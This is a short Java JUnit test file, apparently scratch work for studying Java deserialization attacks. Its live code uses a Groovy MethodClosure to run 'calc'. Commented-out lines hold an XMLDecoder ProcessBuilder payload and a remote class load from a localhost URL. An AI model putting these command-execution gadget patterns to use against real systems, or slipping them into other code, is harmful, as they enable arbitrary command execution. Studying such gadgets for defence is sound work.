package com.endlessshw.serialization.test;

import org.codehaus.groovy.runtime.MethodClosure;
import org.junit.jupiter.api.Test;

import java.net.MalformedURLException;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2024/10/19 11:14
 */
public class TempTest {
    @Test
    public void test() throws MalformedURLException {
        // System.out.println("<java>\\n\" +\n" +
        //         "\"    <object class=\\\"java.lang.ProcessBuilder\\\">\\n\" +\n" +
        //         "\"        <array class=\\\"java.lang.String\\\" length=\\\"1\\\">\\n\" +\n" +
        //         "\"            <void index=\\\"0\\\">\\n\" +\n" +
        //         "\"                <string>calc</string>\\n\" +\n" +
        //         "\"            </void>\\n\" +\n" +
        //         "\"        </array>\\n\" +\n" +
        //         "\"        <void method=\\\"start\\\"></void>\\n\" +\n" +
        //         "\"    </object>\\n\" +\n" +
        //         "\"</java>\\n");
        // URLClassLoader.newInstance(new URL[]{new URL("http://127.0.0.1:8888/TestRef.class")});
        // "123".replace("", "123");
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        methodClosure.call();
    }


}
